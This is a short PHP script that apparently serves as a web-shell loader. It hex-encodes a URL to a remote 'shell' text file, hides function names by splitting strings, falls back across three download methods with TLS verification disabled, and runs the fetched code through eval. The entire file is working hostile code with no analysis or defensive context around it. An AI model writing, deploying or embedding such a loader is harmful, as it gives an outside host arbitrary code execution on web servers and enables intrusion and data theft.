<?php
$hexUrl = '68747470733A2F2F626F63696C73656E7061692E6D792E69642F7368656C6C2F686F6B696279706173732E747874';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadWithFileGetContents($url) {
    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
        return file_get_contents($url);
    }
    return false;
}

function downloadWithCurl($url) {
    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

function downloadWithFopen($url) {
    $result = false;
    if ($fp = fopen($url, 'r')) {
        $result = '';
        while ($data = fread($fp, 8192)) {
            $result .= $data;
        }
        fclose($fp);
    }
    return $result;
}

$phpScript = downloadWithFileGetContents($url);
if ($phpScript === false) {
    $phpScript = downloadWithCurl($url);
}
if ($phpScript === false) {
    $phpScript = downloadWithFopen($url);
}

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);
?>